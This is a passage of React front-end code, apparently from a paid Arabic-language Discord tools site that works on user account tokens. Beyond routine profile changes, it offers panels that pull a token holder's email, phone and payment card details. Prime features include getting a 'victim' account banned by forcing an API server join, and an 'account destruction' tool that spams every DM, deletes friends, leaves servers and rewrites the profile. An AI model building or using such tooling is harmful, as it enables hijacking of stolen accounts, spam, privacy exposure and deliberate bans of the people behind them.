                  <h3 className="text-xl font-black text-yellow-400">ميزة Prime فقط</h3>
                  <p className="text-sm text-white/40 text-center max-w-[240px] leading-relaxed">قفل الحساب متاح فقط لمشتركي Prime</p>
                  <button onClick={() => setShowPrimeModal(true)} className="btn-prime text-sm px-8 py-3 mt-2">⭐ اشتري Prime - 2M كرديت</button>
                </div>)}
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔒</span><h2 className="text-xl font-black text-red-400">قفل حساب</h2>{isPrime && (<span className="prime-badge text-[9px]">PRIME</span>)}</div>
                <p className="text-slate-500 text-sm mb-5">حماية الحساب - قفل / فحص الحالة / فتح القفل</p>
                <TokenInput label="🎫 التوكن" value={lockerToken} onChange={setLockerToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
                <div className="grid grid-cols-3 gap-2.5 mb-5">
                  <ActionBtn text="🔒 قفل الحساب" loading={lockerLoading} color="red" onClick={async () => {
                    if (!lockerToken) { setLockerLogs(['❌ أدخل التوكن']); return }
                    setLockerLoading(true); setLockerLogs(['⏳ جاري قفل الحساب...'])
                    try {
                      const res = await fetch('/api/account-locker', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: lockerToken, action: 'lock' }) })
                      const data = await res.json()
                      if (data.success) { setLockerLogs(data.logs || ['✅ تم بنجاح']) } else { setLockerLogs(['❌ ' + (data.error || 'فشل')]) }
                    } catch { setLockerLogs(['❌ خطأ في الاتصال']) }
                    setLockerLoading(false)
                  }} />
                  <ActionBtn text="🔓 فحص الحالة" loading={lockerLoading} color="yellow" onClick={async () => {
                    if (!lockerToken) { setLockerLogs(['❌ أدخل التوكن']); return }
                    setLockerLoading(true); setLockerLogs(['⏳ جاري فحص الحالة...'])
                    try {
                      const res = await fetch('/api/account-locker', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: lockerToken, action: 'status' }) })
                      const data = await res.json()
                      if (data.success) { setLockerLogs(data.logs || ['✅ تم بنجاح']) } else { setLockerLogs(['❌ ' + (data.error || 'فشل')]) }
                    } catch { setLockerLogs(['❌ خطأ في الاتصال']) }
                    setLockerLoading(false)
                  }} />
                  <ActionBtn text="📝 فتح القفل" loading={lockerLoading} color="green" onClick={async () => {
                    if (!lockerToken) { setLockerLogs(['❌ أدخل التوكن']); return }
                    setLockerLoading(true); setLockerLogs(['⏳ جاري...'])
                    try {
                      const res = await fetch('/api/account-locker', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: lockerToken, action: 'unlock' }) })
                      const data = await res.json()
                      if (data.success) { setLockerLogs(data.logs || ['✅ تم بنجاح']) } else { setLockerLogs(['❌ ' + (data.error || 'فشل')]) }
                    } catch { setLockerLogs(['❌ خطأ في الاتصال']) }
                    setLockerLoading(false)
                  }} />
                </div>
                {lockerLogs.length > 0 && (<div className="bg-black/30 rounded-2xl p-4 border border-red-500/15 animate-fade-in max-h-96 overflow-y-auto">
                  <h3 className="font-bold text-red-400 text-sm mb-3 text-center">📋 النتائج</h3>
                  <div className="space-y-1">{lockerLogs.map((log, i) => (<div key={i} className={`text-xs px-3 py-1.5 rounded-lg ${log.startsWith('❌') ? 'text-red-400 bg-red-500/5' : log.startsWith('✅') ? 'text-green-400 bg-green-500/5' : log.startsWith('⚠️') ? 'text-yellow-400 bg-yellow-500/5' : log.startsWith('⏳') ? 'text-cyan-400 bg-cyan-500/5' : 'text-white/60 bg-white/3'} font-mono`}>{log}</div>))}</div>
                </div>)}
              </div></div>
            )}

            {/* ==================== CHANGE AVATAR ==================== */}
            {section === 'avatar' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🖼️</span><h2 className="text-xl font-black text-purple-400">تغيير الأفتار</h2></div>
                <p className="text-slate-500 text-sm mb-5">غيّر صورة الحساب عن طريق رابط الصورة</p>
                <TokenInput label="🎫 التوكن" value={avatarToken} onChange={setAvatarToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🖼️ رابط الصورة" value={avatarUrl} onChange={setAvatarUrl} placeholder="https://example.com/avatar.png" accent="purple" />
                <ActionBtn text="🖼️ تغيير الأفتار" loading={loading} color="purple" onClick={() => { if (!avatarToken || !avatarUrl) { setResult('❌ أدخل التوكن + رابط الصورة'); return }; api('change-avatar', { token: avatarToken, avatarUrl }) }} />
              </div></div>
            )}
            {/* ==================== HYPESQUAD ==================== */}
            {section === 'hypesquad' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎮</span><h2 className="text-xl font-black text-purple-400">هايب سكواد</h2></div>
                <p className="text-slate-500 text-sm mb-5">غيّر هاوس HypeSquad لحسابك - Bravery, Brilliance, Balance</p>
                <TokenInput label="🎫 التوكن" value={hypeToken} onChange={setHypeToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
                <div className="grid grid-cols-3 gap-3 mb-5">
                  <button onClick={() => setHypeHouse(1)} className={`rounded-xl p-4 border-2 transition-all cursor-pointer text-center ${hypeHouse === 1 ? 'border-orange-400 bg-orange-500/15 shadow-lg shadow-orange-500/10' : 'border-white/10 bg-white/3 hover:border-orange-500/30 hover:bg-orange-500/5'}`}>
                    <div className="text-3xl mb-2">⚔️</div>
                    <div className={`text-sm font-bold ${hypeHouse === 1 ? 'text-orange-400' : 'text-white/50'}`}>Bravery</div>
                    <div className="text-[9px] text-white/30 mt-1">الشجاعة</div>
                  </button>
                  <button onClick={() => setHypeHouse(2)} className={`rounded-xl p-4 border-2 transition-all cursor-pointer text-center ${hypeHouse === 2 ? 'border-blue-400 bg-blue-500/15 shadow-lg shadow-blue-500/10' : 'border-white/10 bg-white/3 hover:border-blue-500/30 hover:bg-blue-500/5'}`}>
                    <div className="text-3xl mb-2">🧠</div>
                    <div className={`text-sm font-bold ${hypeHouse === 2 ? 'text-blue-400' : 'text-white/50'}`}>Brilliance</div>
                    <div className="text-[9px] text-white/30 mt-1">العبقرية</div>
                  </button>
                  <button onClick={() => setHypeHouse(3)} className={`rounded-xl p-4 border-2 transition-all cursor-pointer text-center ${hypeHouse === 3 ? 'border-green-400 bg-green-500/15 shadow-lg shadow-green-500/10' : 'border-white/10 bg-white/3 hover:border-green-500/30 hover:bg-green-500/5'}`}>
                    <div className="text-3xl mb-2">⚖️</div>
                    <div className={`text-sm font-bold ${hypeHouse === 3 ? 'text-green-400' : 'text-white/50'}`}>Balance</div>
                    <div className="text-[9px] text-white/30 mt-1">التوازن</div>
                  </button>
                </div>
                <ActionBtn text="🎮 تغيير الهاوس" loading={loading} color="purple" onClick={async () => { if (!hypeToken) { setResult('❌ أدخل التوكن'); return }; setLoading(true); setResult(''); setProgress('🎮 جاري تغيير الهاوس...'); try { const res = await fetch('/api/hypesquad', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: hypeToken, house: hypeHouse }) }); const data = await res.json(); if (data.success) { setResult('✅ ' + (data.message || 'تم التغيير بنجاح!')) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
              </div></div>
            )}

            {/* ==================== DISCONNECT ==================== */}
            {section === 'disconnect' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-orange-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔌</span><h2 className="text-xl font-black text-orange-400">قطع اتصال التوكن</h2></div>
                <p className="text-slate-500 text-sm mb-5">تسجيل خروج من كل الأجهزة - قطع جميع جلسات التوكن</p>
                <TokenInput label="🎫 التوكن" value={disconnectToken} onChange={setDisconnectToken} accent="orange" onHelp={() => setShowTokenGuide(true)} />
                <div className="bg-red-500/5 rounded-xl p-4 mb-5 border border-red-500/15">
                  <p className="text-xs text-red-400/80">⚠️ تحذير: بعد قطع الاتصال لن يعمل التوكن مجدداً! تأكد قبل المتابعة</p>
                </div>
                <ActionBtn text="🔌 قطع الاتصال" loading={loading} color="red" onClick={async () => {
                  if (!disconnectToken) { setResult('❌ أدخل التوكن'); return }
                  setLoading(true); setProgress('🔌 جاري قطع الاتصال...'); setResult('')
                  try {
                    const res = await fetch('/api/token-disconnect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: disconnectToken }) })
                    const data = await res.json()
                    if (data.success) setResult(data.message || '✅ تم قطع الاتصال بنجاح!')
                    else setResult('❌ ' + (data.error || 'فشل'))
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />
              </div></div>
            )}
            {/* ==================== TOKEN INFO ==================== */}
            {section === 'token-info' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-indigo-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔍</span><h2 className="text-xl font-black text-indigo-400">معلومات توكن</h2></div>
                <p className="text-slate-500 text-sm mb-5">عرض كل بيانات الحساب: البروفايل، الإيميل، الدفع، الأصدقاء، السيرفرات، الحسابات المربوطة، النيترو و 2FA - يدعم توكنات المستخدم والبوت</p>
                <TokenInput label="🎫 التوكن" value={tiToken} onChange={setTiToken} accent="indigo" onHelp={() => setShowTokenGuide(true)} />
                <ActionBtn text="🔍 عرض المعلومات" loading={loading} color="indigo" onClick={async () => {
                  if (!tiToken) { setResult('❌ أدخل التوكن'); return }
                  setLoading(true); setResult(''); setTiResult(null); setProgress('🔍 جاري جلب المعلومات...')
                  try {
                    const res = await fetch('/api/token-info', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: tiToken }), signal: AbortSignal.timeout(30000) })
                    const data = await res.json()
                    if (data.success) { setTiResult(data); setResult(`✅ تم جلب معلومات الحساب - ${data.token_type === 'bot' ? '🤖 بوت' : '👤 مستخدم'}`) } else { setResult('❌ ' + (data.error || 'فشل')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />
                {tiResult && tiResult.success && (
                  <div className="mt-5 space-y-3 animate-fade-in">
                    {/* بطاقة البروفايل */}
                    <div className="bg-indigo-500/8 rounded-xl p-4 border border-indigo-500/15">
                      <div className="flex items-center gap-3 mb-3">
                        {tiResult.avatar && <img src={tiResult.avatar} className="w-14 h-14 rounded-full border-2 border-indigo-500/30" />}
                        <div className="flex-1">
                          <div className="text-sm font-bold text-white">{tiResult.username || ''}{tiResult.discriminator && tiResult.discriminator !== '0' ? `#${tiResult.discriminator}` : ''}</div>
                          {tiResult.global_name && <div className="text-[10px] text-indigo-300/60">الاسم المعروض: {tiResult.global_name}</div>}
                          <div className="text-[10px] text-indigo-300/60">ID: {tiResult.id || ''} | نوع: {tiResult.token_type === 'bot' ? '🤖 بوت' : '👤 مستخدم'} | انشاء: {tiResult.created_at || 'غير معروف'}</div>
                        </div>
                        {tiResult.premium && <span className="text-[10px] bg-indigo-500/20 text-indigo-400 px-2 py-1 rounded-lg border border-indigo-500/20">💎 {tiResult.premium_label || 'نيترو'}</span>}
                        {tiResult.mfa && <span className="text-[10px] bg-green-500/20 text-green-400 px-2 py-1 rounded-lg border border-green-500/20">🔐 2FA</span>}
                      </div>
                      {/* البانر */}
                      {tiResult.banner && <img src={tiResult.banner} className="w-full h-24 object-cover rounded-lg mb-3 border border-indigo-500/15" />}
                      <div className="grid grid-cols-2 gap-2">
                        {tiResult.email && <InfoPill label="البريد" value={tiResult.email} />}
                        {tiResult.phone && <InfoPill label="الهاتف" value={tiResult.phone} />}
                        {tiResult.locale && <InfoPill label="اللغة" value={tiResult.locale} />}
                        <InfoPill label="توثيق البريد" value={tiResult.verified ? 'موثق ✓' : 'غير موثق ✗'} />
                        <InfoPill label="النيترو" value={tiResult.premium_label || 'بدون'} />
                        <InfoPill label="2FA" value={tiResult.mfa ? 'مفعّل ✓' : 'غير مفعّل ✗'} />
                        {tiResult.token_type === 'user' && <InfoPill label="الأصدقاء" value={String(tiResult.friend_count || 0)} />}
                        {tiResult.token_type === 'user' && <InfoPill label="السيرفرات" value={String(tiResult.guild_count || 0)} />}
                      </div>
                    </div>
                    {/* الفلاقات */}
                    {tiResult.flags_list && tiResult.flags_list.length > 0 && (
                      <div className="bg-blue-500/8 rounded-xl p-4 border border-blue-500/15">
                        <div className="text-xs font-bold text-blue-400 mb-2">🏅 الشارات</div>
                        <div className="flex flex-wrap gap-1.5">
                          {tiResult.flags_list.map((f: string, i: number) => (
                            <span key={i} className="text-[10px] bg-blue-500/15 text-blue-300 px-2 py-1 rounded-lg border border-blue-500/20">{f}</span>
                          ))}
                        </div>
                      </div>
                    )}
                    {/* معلومات البوت */}
                    {tiResult.token_type === 'bot' && (
                      <div className="bg-purple-500/8 rounded-xl p-4 border border-purple-500/15">
                        <div className="text-xs font-bold text-purple-400 mb-2">🤖 معلومات البوت</div>
                        <div className="grid grid-cols-2 gap-2">
                          <InfoPill label="عام" value={tiResult.bot_public ? 'نعم' : 'لا'} />
                          <InfoPill label="يتطلب كود" value={tiResult.bot_require_code_grant ? 'نعم' : 'لا'} />
                        </div>
                      </div>
                    )}
                    {/* معلومات الدفع */}
                    {tiResult.payments && (
                      <div className="bg-purple-500/8 rounded-xl p-4 border border-purple-500/15">
                        <div className="text-xs font-bold text-purple-400 mb-2">💳 معلومات الدفع</div>
                        <div className="grid grid-cols-2 gap-2">
                          <InfoPill label="نوع البطاقة" value={tiResult.payments.type || 'لا يوجد'} />
                          <InfoPill label="آخر 4 أرقام" value={tiResult.payments.last_4 || 'لا يوجد'} />
                          <InfoPill label="تاريخ الانتهاء" value={tiResult.payments.expires || 'لا يوجد'} />
                          <InfoPill label="البلد" value={tiResult.payments.country || 'لا يوجد'} />
                        </div>
                      </div>
                    )}
                    {/* الحسابات المربوطة */}
                    {tiResult.connections && tiResult.connections.length > 0 && (
                      <div className="bg-cyan-500/8 rounded-xl p-4 border border-cyan-500/15">
                        <div className="text-xs font-bold text-cyan-400 mb-2">🔗 الحسابات المربوطة ({tiResult.connections.length})</div>
                        <div className="space-y-1.5">
                          {tiResult.connections.map((c: any, i: number) => (
                            <div key={i} className="flex items-center gap-2 text-[10px]">
                              <span className="text-white/40">{c.type}:</span>
                              <span className="text-cyan-300">{c.name || 'مربوط'}</span>
                              {c.verified && <span className="text-green-400">✓ موثق</span>}
                              {c.visible && <span className="text-yellow-400">👁 مرئي</span>}
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                    {/* البايو */}
                    {tiResult.bio && (
                      <div className="bg-amber-500/8 rounded-xl p-4 border border-amber-500/15">
                        <div className="text-xs font-bold text-amber-400 mb-1">📝 البايو</div>
                        <div className="text-xs text-white/70">{tiResult.bio}</div>
                      </div>
                    )}
                  </div>
                )}
              </div></div>
            )}

            {/* ==================== ROLES MANAGER ==================== */}
            {section === 'roles-manager' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-rose-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🛡️</span><h2 className="text-xl font-black text-rose-400">إدارة رتب</h2></div>
                <p className="text-slate-500 text-sm mb-5">إعطاء أو سحب رتبة من جميع أعضاء السيرفر - أو حذف وإنشاء رتب</p>
                <TokenInput label="🎫 التوكن" value={rmToken} onChange={setRmToken} accent="rose" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🏰 أيدي السيرفر" value={rmGuildId} onChange={setRmGuildId} placeholder="Server ID" accent="rose" />
                <TextInput label="🛡️ أيدي الرتبة" value={rmRoleId} onChange={setRmRoleId} placeholder="Role ID" accent="rose" />
                <div className="grid grid-cols-3 gap-2 mb-4">
                  <ActionBtn text="➕ إعطاء الكل" loading={loading} color="green" onClick={async () => { if (!rmToken || !rmGuildId || !rmRoleId) { setResult('❌ أدخل التوكن + السيرفر + الرتبة'); return }; setLoading(true); setResult(''); setProgress('➕ جاري إعطاء الرتبة للجميع...'); try { const res = await fetch('/api/roles-manager', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: rmToken, guildId: rmGuildId, roleId: rmRoleId, action: 'give_all' }), signal: AbortSignal.timeout(180000) }); const data = await res.json(); if (data.success) { setResult(`✅ تم إعطاء الرتبة - نجح: ${data.succeeded || 0} | فشل: ${data.failed || 0} | المجموع: ${data.total || 0}`); if (data.total) setStats({ roles: data.succeeded }) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
                  <ActionBtn text="➖ سحب من الكل" loading={loading} color="red" onClick={async () => { if (!rmToken || !rmGuildId || !rmRoleId) { setResult('❌ أدخل التوكن + السيرفر + الرتبة'); return }; setLoading(true); setResult(''); setProgress('➖ جاري سحب الرتبة من الجميع...'); try { const res = await fetch('/api/roles-manager', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: rmToken, guildId: rmGuildId, roleId: rmRoleId, action: 'remove_all' }), signal: AbortSignal.timeout(180000) }); const data = await res.json(); if (data.success) { setResult(`✅ تم سحب الرتبة - نجح: ${data.succeeded || 0} | فشل: ${data.failed || 0} | المجموع: ${data.total || 0}`) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
                  <ActionBtn text="🗑️ حذف الرتبة" loading={loading} color="orange" onClick={async () => { if (!rmToken || !rmGuildId || !rmRoleId) { setResult('❌ أدخل التوكن + السيرفر + الرتبة'); return }; setLoading(true); setResult(''); setProgress('🗑️ جاري حذف الرتبة...'); try { const res = await fetch('/api/roles-manager', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: rmToken, guildId: rmGuildId, roleId: rmRoleId, action: 'delete_role' }) }); const data = await res.json(); if (data.success) { setResult('✅ تم حذف الرتبة بنجاح') } else { setResult('❌ ' + (data.error || 'فشل حذف الرتبة')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
                </div>
                <div className="bg-rose-500/5 rounded-xl p-3 border border-rose-500/10">
                  <div className="text-[10px] text-rose-400/60 space-y-1">
                    <p>💡 <span className="text-rose-400/80 font-bold">ملاحظة:</span></p>
                    <p>• التوكن يحتاج صلاحية Manage Roles في السيرفر</p>
                    <p>• إعطاء/سحب رتبة من الكل = 50 عضو بالتوازي</p>
                    <p>• حذف الرتبة يحذفها نهائياً من السيرفر</p>
                  </div>
                </div>
              </div></div>
            )}
            {/* ==================== TOKEN BAN (PRIME) ==================== */}
            {section === 'token-ban' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20 relative min-h-[460px]">
                {!isPrime && (<div className="prime-lock-overlay">
                  <div className="prime-lock-icon">⭐</div>
                  <h3 className="text-xl font-black text-yellow-400">ميزة Prime فقط</h3>
                  <p className="text-sm text-white/40 text-center max-w-[240px] leading-relaxed">تبنيد الحساب متاح فقط لمشتركي Prime</p>
                  <button onClick={() => setShowPrimeModal(true)} className="btn-prime text-sm px-8 py-3 mt-2">⭐ اشتري Prime - 2M كرديت</button>
                </div>)}
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🚫</span><h2 className="text-xl font-black text-red-400">تبنيد حساب من توكن</h2>{isPrime && (<span className="prime-badge text-[9px]">PRIME</span>)}</div>
                <p className="text-slate-500 text-sm mb-5">حظر حساب ضحية - يدخل حساب الضحية سيرفر البوت عن طريق API وديسكورد يكتشف ويبند الحساب</p>
                <div className="bg-red-500/5 rounded-xl p-4 mb-5 border border-red-500/15">
                  <div className="text-[11px] text-red-400/80 space-y-1.5">
                    <p>⚠️ <span className="font-bold">كيف يعمل:</span></p>
                    <p>1. تضع توكن الحساب المراد تبنيده (User Token)</p>
                    <p>2. تضع توكن أي بوت عندك (Bot Token)</p>
                    <p>3. الموقع يصنع سيرفر جديد بالبوت ويعمل دعوة</p>
                    <p>4. يدخل حساب الضحية لسيرفر البوت عن طريق API (مو العادي)</p>
                    <p>5. ديسكورد يكتشف إن الحساب دخل سيرفر عبر API ويسحبه ويحظره</p>
                    <p>6. السيرفر يبقى موجود - ما يتم حذفه</p>
                  </div>
                </div>
                <div className="space-y-4 mb-5">
                  <div>
                    <label className="text-[11px] text-red-300/70 mb-1 block">👤 توكن الضحية (User Token)</label>
                    <div className="relative">
                      <input type="password" value={tbUserToken} onChange={e => setTbUserToken(e.target.value)} placeholder="توكن الحساب المراد تبنيده..." className="w-full bg-black/30 border border-red-500/30 rounded-xl px-4 py-3 pr-10 text-white text-sm placeholder-red-700/30 focus:outline-none focus:border-red-400/50 transition-colors" />
                      <span className="absolute right-3 top-1/2 -translate-y-1/2 text-red-500/40 text-sm">👤</span>
                    </div>
                  </div>
                  <div>
                    <label className="text-[11px] text-purple-300/70 mb-1 block">🤖 توكن البوت (Bot Token)</label>
                    <div className="relative">
                      <input type="password" value={tbBotToken} onChange={e => setTbBotToken(e.target.value)} placeholder="توكن أي بوت عندك..." className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 pr-10 text-white text-sm placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 transition-colors" />
                      <span className="absolute right-3 top-1/2 -translate-y-1/2 text-purple-500/40 text-sm">🤖</span>
                    </div>
                  </div>
                </div>
                <ActionBtn text="🚫 تبنيد الحساب" loading={loading} color="red" onClick={async () => {
                  if (!tbUserToken) { setResult('❌ أدخل توكن الضحية'); return }
                  if (!tbBotToken) { setResult('❌ أدخل توكن البوت'); return }
                  setLoading(true); setResult(''); setProgress('🚫 جاري تبنيد الحساب...')
                  try {
                    const res = await fetch('/api/token-ban', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userToken: tbUserToken, botToken: tbBotToken }), signal: AbortSignal.timeout(120000) })
                    const data = await res.json()
                    if (data.success) {
                      const lines = data.steps || []
                      setResult(lines.join('\n'))
                      if (data.victim) setStats({ banned: 1 })
                    } else { setResult('❌ ' + (data.error || 'فشل')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />
                <div className="mt-4 bg-amber-500/5 rounded-xl p-3 border border-amber-500/10">
                  <div className="text-[10px] text-amber-400/60 space-y-1">
                    <p>💡 <span className="text-amber-400/80 font-bold">ملاحظات:</span></p>
                    <p>• السيرفر يبقى موجود بعد العملية - ما يتم حذفه</p>
                    <p>• البوت محدود 10 سيرفرات يومياً في إنشاء سيرفرات</p>
                    <p>• ديسكورد يكتشف الدخول عبر API ويحظر الحساب تلقائياً</p>
                    <p>• الحظر قد يأخذ من دقائق لساعات حسب نظام ديسكورد</p>
                  </div>
                </div>
              </div></div>
            )}

            {/* ==================== ACCOUNT DESTRUCTION - PRIME ONLY ==================== */}
            {section === 'account-destruction' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20 relative min-h-[500px]">
                {!isPrime && (<div className="prime-lock-overlay">
                  <div className="prime-lock-icon">⭐</div>
                  <h3 className="text-xl font-black text-yellow-400">ميزة Prime فقط</h3>
                  <p className="text-sm text-white/40 text-center max-w-[240px] leading-relaxed">تدمير الحساب متاح فقط لمشتركي Prime</p>
                  <button onClick={() => setShowPrimeModal(true)} className="btn-prime text-sm px-8 py-3 mt-2">⭐ اشتري Prime - 2M كرديت</button>
                </div>)}
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💀</span><h2 className="text-xl font-black text-red-400">تدمير حساب كامل</h2>{isPrime && (<span className="prime-badge text-[9px]">PRIME</span>)}</div>
                <p className="text-slate-500 text-sm mb-5">تدمير شامل للحساب - سبام DMs + حذف أصدقاء + مغادرة سيرفرات + تغيير البروفايل</p>

                {/* شرح الميزة */}
                <div className="bg-red-500/5 rounded-xl p-4 mb-5 border border-red-500/15">
                  <div className="text-[11px] text-red-400/80 space-y-1.5">
                    <p>⚠️ <span className="font-bold">ماذا يفعل تدمير الحساب؟</span></p>
                    <p>🔥 <span className="text-red-300">سبام جميع DMs:</span> يرسل رسالتك لكل محادثة خاصة</p>
                    <p>👥 <span className="text-red-300">حذف الأصدقاء:</span> يحذف جميع أصدقاء الحساب</p>
                    <p>🚪 <span className="text-red-300">مغادرة السيرفرات:</span> يغادر كل السيرفرات (ما عدا المملوكة)</p>
                    <p>📪 <span className="text-red-300">إغلاق DMs:</span> يغلق جميع المحادثات الخاصة</p>
                    <p>📝 <span className="text-red-300">تغيير البروفايل:</span> يغير الاسم والصورة والبايو</p>
                  </div>
                </div>

                <TokenInput label="🎫 توكن الحساب المراد تدميره" value={adDestToken} onChange={setAdDestToken} accent="red" onHelp={() => setShowTokenGuide(true)} />

                {/* خيارات التدمير */}
                <div className="mb-5">
                  <label className="text-[11px] text-red-300/70 mb-3 block">⚡ خيارات التدمير:</label>
                  <div className="grid grid-cols-2 gap-2">
                    {[
                      { key: 'spamDMs', label: '📧 سبام DMs', desc: 'إرسال رسالة لكل محادثة' },
                      { key: 'deleteFriends', label: '👥 حذف الأصدقاء', desc: 'إزالة جميع الأصدقاء' },
                      { key: 'leaveServers', label: '🚪 مغادرة السيرفرات', desc: 'الخروج من كل السيرفرات' },
                      { key: 'closeDMs', label: '📪 إغلاق DMs', desc: 'إغلاق المحادثات' },
                    ].map(opt => (
                      <button key={opt.key} onClick={() => setAdActions(prev => ({ ...prev, [opt.key]: !prev[opt.key as keyof typeof prev] }))} className={`p-3 rounded-xl transition-all cursor-pointer border text-right ${adActions[opt.key as keyof typeof adActions] ? 'bg-red-500/15 text-red-400 border-red-500/30' : 'bg-white/3 text-white/40 border-white/10'}`}>
                        <div className="text-xs font-bold">{opt.label}</div>
                        <div className="text-[9px] opacity-60">{opt.desc}</div>
                      </button>
                    ))}
                  </div>
                </div>

                {/* إعدادات البروفايل */}
                <div className="mb-5">
                  <label className="text-[11px] text-red-300/70 mb-2 block">📝 تغيير البروفايل (اختياري):</label>
                  <div className="space-y-2">
                    <input type="text" value={adUsername} onChange={e => setAdUsername(e.target.value)} placeholder="الاسم الجديد..." className="w-full bg-black/30 border border-red-500/20 rounded-xl px-4 py-2.5 text-white text-sm placeholder-white/20 focus:outline-none focus:border-red-400/40 transition-colors" />
                    <textarea value={adBio} onChange={e => setAdBio(e.target.value)} placeholder="البايو الجديد..." rows={2} className="w-full bg-black/30 border border-red-500/20 rounded-xl px-4 py-2.5 text-white text-sm placeholder-white/20 focus:outline-none focus:border-red-400/40 transition-colors resize-none" />
                    <input type="text" value={adAvatar} onChange={e => setAdAvatar(e.target.value)} placeholder="رابط الصورة الجديدة (اختياري)..." className="w-full bg-black/30 border border-red-500/20 rounded-xl px-4 py-2.5 text-white text-sm placeholder-white/20 focus:outline-none focus:border-red-400/40 transition-colors" />
                  </div>
                </div>

                {/* رسالة السبام */}
                {adActions.spamDMs && (
                  <div className="mb-5">
                    <label className="text-[11px] text-red-300/70 mb-1 block">📧 رسالة السبام:</label>
                    <textarea value={adMessage} onChange={e => setAdMessage(e.target.value)} placeholder="اكتب رسالتك هنا..." rows={2} className="w-full bg-black/30 border border-red-500/20 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none focus:border-red-400/40 transition-colors resize-none" />
                  </div>
                )}

                {/* زر التدمير */}
                <ActionBtn text="💀 بدء تدمير الحساب" loading={adLoading} color="red" onClick={async () => {
                  if (!adDestToken) { setAdLogs(['❌ أدخل التوكن']); return }
                  if (!adActions.spamDMs && !adActions.deleteFriends && !adActions.leaveServers && !adActions.closeDMs && !adUsername && !adBio) { setAdLogs(['❌ اختر على الأقل إجراء واحد']); return }
                  setAdLoading(true); setAdLogs(['⏳ جاري تدمير الحساب...']); setAdStats(null)
                  try {
                    const res = await fetch('/api/account-destruction', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                        token: adDestToken,
                        actions: adActions,
                        message: adMessage,
                        profile: { username: adUsername, bio: adBio, avatar: adAvatar }
                      }),
                      signal: AbortSignal.timeout(300000)
                    })
                    const data = await res.json()
                    if (data.success) {
                      setAdLogs(data.logs || ['✅ تم التدمير'])
                      if (data.stats) setAdStats(data.stats)
                    } else { setAdLogs(['❌ ' + (data.error || 'فشل')]) }
                  } catch { setAdLogs(['❌ خطأ في الاتصال']) }
                  setAdLoading(false)
                }} />

                {/* النتائج */}
                {adLogs.length > 0 && (
                  <div className="bg-black/30 rounded-2xl p-4 border border-red-500/15 animate-fade-in mt-4 max-h-80 overflow-y-auto">
                    <h3 className="font-bold text-red-400 text-sm mb-3 text-center">📋 نتائج التدمير</h3>
                    <div className="space-y-1">{adLogs.map((log, i) => (
                      <div key={i} className={`text-xs px-3 py-1.5 rounded-lg font-mono ${log.startsWith('❌') ? 'text-red-400 bg-red-500/5' : log.startsWith('✅') ? 'text-green-400 bg-green-500/5' : log.startsWith('🎯') ? 'text-yellow-400 bg-yellow-500/5' : log.startsWith('💀') ? 'text-purple-400 bg-purple-500/5' : log.startsWith('📊') ? 'text-cyan-400 bg-cyan-500/5' : 'text-white/60 bg-white/3'}`}>{log}</div>
                    ))}</div>
                  </div>
                )}

                {/* الإحصائيات */}
                {adStats && (
                  <div className="grid grid-cols-4 gap-2 mt-4">
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
                      <div className="text-[10px] text-white/40">📧 رسائل</div>
                      <div className="text-lg font-bold text-red-400">{adStats.dmsSpammed}</div>
                    </div>
                    <div className="bg-black/20 rounded-xl p-3 border border-white/5 text-center">
